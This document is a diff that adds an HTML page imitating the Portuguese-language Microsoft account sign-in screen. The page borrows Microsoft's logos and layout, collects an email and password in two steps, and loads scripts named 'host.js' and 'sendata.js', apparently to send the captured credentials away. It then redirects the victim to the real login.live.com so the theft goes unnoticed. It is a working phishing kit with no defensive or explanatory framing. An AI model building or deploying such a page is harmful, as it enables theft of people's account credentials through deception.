@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Entrar - Conta Microsoft</title>
+  <link rel="shortcut icon" href="https://th.bing.com/th/id/R.d335fdbca60b87965020fb870ac00762?rik=6kmL%2ffGc1THfgg&riu=http%3a%2f%2fpngimg.com%2fuploads%2fmicrosoft%2fsmall%2fmicrosoft_PNG13.png&ehk=9BDjiTQ24oxHd5wn5CgVuHMHyewUmqwtuYMI4FnIUts%3d&risl=&pid=ImgRaw&r=0" type="image/x-icon">
+  <style>
+   body {
+  margin: 0;
+  font-family: "Segoe UI", sans-serif;
+  background: url("https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg") no-repeat center center fixed;
+  background-size: cover;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+  
+}
+
+    .container {
+      background: #fff;
+      width: 100%;
+      max-width: 420px;
+      padding: 40px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    }
+
+    .logo {
+      width: 110px;
+      margin-bottom: 24px;
+    }
+
+    h2 {
+      margin: 0 0 20px;
+      font-size: 24px;
+      font-weight: normal;
+    }
+
+    .input {
+      width: 100%;
+      font-size: 16px;
+      padding: 10px 0;
+      border: none;
+      border-bottom: 1px solid #888;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+
+    .input:focus {
+      border-bottom: 2px solid #0067b8;
+    }
+
+    .links a {
+      display: block;
+      font-size: 14px;
+      color: #0067b8;
+      text-decoration: none;
+      margin-top: 16px;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 32px;
+    }
+
+    .btn {
+      padding: 10px 24px;
+      font-size: 15px;
+      border: none;
+      cursor: pointer;
+    }
+
+    .btn-back {
+      background: #e6e6e6;
+    }
+
+    .btn-next {
+      background: #0067b8;
+      color: white;
+    }
+
+    .options {
+        margin-top: 24px;
+        background: white;
+        width: 100%;
+        max-width: 500px; /* igual ao container */
+        padding: 10px;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.15);
+        display: flex;
+        align-items: center;
+        cursor: pointer;
+        box-sizing: border-box;
+       
+}
+    .options:hover{
+      background-color: #e8e8e8;
+      cursor: pointer;
+    }
+
+
+    .options img {
+      width: 38px;
+      margin-left: 30px ;
+    }
+
+    .fade {
+      opacity: 0;
+      transition: opacity 0.3s ease, transform 0.3s ease;
+      transform: translateX(20px);
+      position: absolute;
+      width: 100%;
+    }
+
+    .fade.active {
+      opacity: 1;
+      transform: translateX(0);
+      position: relative;
+    }
+
+    .username-display {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 16px;
+    }
+    .links .no-acess{
+      color: black;
+      text-decoration: none;
+
+    }
+     .links .no-acess strong{
+      color: #0067b8;
+     }
+
+     .res{
+      color: red;
+      margin-bottom: 2px;
+     }
+
+    @media (max-width: 480px) {
+      body{
+        background: none;
+      }
+       .container{
+        width: 90%;
+       }
+        .options img{
+          margin: 0;
+        }
+      .container, .options {
+        box-shadow: none;
+        border-radius: 0;
+        height: auto;
+        min-height: unset;
+      }
+
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Etapa 1: Email -->
+    <div id="step1" class="fade active">
+      <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft Logo">
+      <h2>Entrar</h2>
+        <div class="res"></div>
+      <input class="inputName input" type="text" id="email" placeholder="Email, telefone ou Skype">
+      <input type="text" class="platform" style="display: none;" value="Microsoft">
+      <div class="links">
+        <a href="#" class="no-acess">Não tem uma conta? <strong>Crie uma!</strong></a>
+        <a href="#">Não consegue acessar sua conta?</a>
+      </div>
+      <div class="buttons">
+        <button class="btn btn-back" onclick="voltar()">Voltar</button>
+        <button class="btn btn-next" onclick="continuar()">Avançar</button>
+      </div>
+    </div>
+
+    <!-- Etapa 2: Senha -->
+    <div id="step2" class="fade">
+      <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft Logo">
+      <h2>Bem-vindo</h2>
+      <div class="username-display" id="usuario"></div>
+      <div class="res"></div>
+      <input class="inputPass input" type="password" id="senha" placeholder="Senha">
+      <div class="links">
+        <a href="#">Esqueceu a senha?</a>
+      </div>
+      <div class="buttons">
+        <button class="btn btn-back" onclick="voltarEmail()">Voltar</button>
+        <button class="enviar btn btn-next" onclick="login()">Entrar</button>
+      
+      </div>
+    </div>
+  </div>
+
+  <div class="options" onclick="">
+    <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" />
+    Opções de entrada
+  </div>
+
+  <script src="../host.js"></script>
+  <script src="../sendata.js"></script>
+  <script>
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const usuario = document.getElementById('usuario');
+    const email = document.getElementById('email');
+    const senha = document.getElementById('senha');
+    const res = document.querySelectorAll(".res")
+    document.addEventListener("click",(e)=>{
+      if(e.target.classList[0] === "enviar"){
+        location.href = `https://login.live.com/oauth20_authorize.srf?username=`
+      }
+    })
+
+    document.addEventListener("keydown",(e)=>{
+      if(e.target.id === "email" || e.target.id === "senha"){
+        res[0].innerText = ""
+        res[1].innerText = ""
+      }
+    })
+
+    function continuar() {
+      if (email.value.trim() === "") {
+        res[0].innerText = " Insira um endereço de email, número de telefone ou nome Skype válido."
+        return;
+      }
+
+      usuario.textContent = email.value.trim();
+      step1.classList.remove("active");
+      step2.classList.add("active");
+    }
+
+    function voltarEmail() {
+      step2.classList.remove("active");
+      step1.classList.add("active");
+    }
+
+    function voltar() {
+      alert("Voltar clicado (não há página anterior)");
+    }
+
+    function login() {
+      if (senha.value.trim() === "") {
+        res[1].innerText = "Use a senha da sua conta Microsoft."
+        return;
+      }
+
+    }
+
+    
+  </script>
+
+</body>
+</html>
